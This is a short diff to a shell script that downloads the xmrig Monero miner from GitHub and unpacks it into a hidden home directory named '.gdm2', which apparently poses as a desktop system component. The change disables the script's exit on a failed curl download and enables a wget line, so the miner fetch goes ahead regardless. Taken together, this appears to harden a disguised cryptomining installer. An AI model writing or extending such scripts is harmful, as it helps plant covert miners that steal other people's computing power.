@@ -161,10 +161,10 @@ rm -rf $HOME/.gdm2
 echo "[*] Downloading MoneroOcean advanced version of xmrig to xmrig.tar.gz"
 if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o xmrig.tar.gz; then
   echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to xmrig.tar.gz"
-  exit 1
+#  exit 1
 fi
 
-# wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
+wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz
 
 echo "[*] Unpacking xmrig.tar.gz to $HOME/.gdm2"
 [ -d $HOME/.gdm2 ] || mkdir $HOME/.gdm2
